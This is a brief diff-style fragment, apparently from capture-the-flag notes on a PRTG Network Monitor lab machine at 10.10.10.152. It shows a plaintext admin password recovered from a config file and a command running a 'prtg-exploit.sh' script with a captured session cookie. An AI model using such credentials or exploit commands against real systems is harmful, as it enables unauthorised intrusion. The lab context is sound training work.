@@ -1,0 +1,7 @@
+<dbpassword>
+	      <!-- User: prtgadmin:PrTg@dmin2018 -->
+	      PrTg@dmin2018
+            </dbpassword>
+            
+            
+./prtg-exploit.sh -u http://10.10.10.152 -c "_ga=GA1.4.1339018602.1591651002; _gid=GA1.4.1077216957.1591651002; OCTOPUS1813713946=ezhGOTFCMkFGLTFFODMtNDgzMy05QzNDLUVFMDQxNUU0NERGQ30%3D _gat=1"
